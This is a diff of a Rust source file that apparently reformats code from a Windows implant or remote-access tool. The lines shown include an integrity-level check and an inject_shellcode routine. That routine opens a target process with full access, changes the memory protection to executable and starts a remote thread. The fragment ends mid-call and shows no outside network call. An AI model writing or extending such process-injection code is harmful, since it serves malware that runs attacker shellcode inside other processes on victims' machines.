@@ -230,11 +230,7 @@ fn list_dir(path: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn integrity_level() -> String {
-    use windows::{
-        Win32::Foundation::*,
-        Win32::Security::*,
-        Win32::System::Threading::*,
-    };
+    use windows::{Win32::Foundation::*, Win32::Security::*, Win32::System::Threading::*};
 
     const LOW: u32 = 0x1000;
     const MEDIUM: u32 = 0x2000;
@@ -243,13 +239,7 @@ fn integrity_level() -> String {
 
     unsafe {
         let mut token = HANDLE::default();
-        if OpenProcessToken(
-            GetCurrentProcess(),
-            TOKEN_QUERY,
-            &mut token,
-        )
-        .is_err()
-        {
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
             return "unknown".into();
         }
 
@@ -321,11 +311,7 @@ fn inject_cmd(args: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
-    use windows::{
-        Win32::Foundation::*,
-        Win32::System::Memory::*,
-        Win32::System::Threading::*,
-    };
+    use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};
 
     unsafe {
         let proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
@@ -355,13 +341,7 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
         );
 
         let mut old = PAGE_PROTECTION_FLAGS(0);
-        let _ = VirtualProtectEx(
-            proc,
-            addr,
-            shellcode.len(),
-            PAGE_EXECUTE_READ,
-            &mut old,
-        );
+        let _ = VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
 
         let thr = CreateRemoteThread(
             proc,
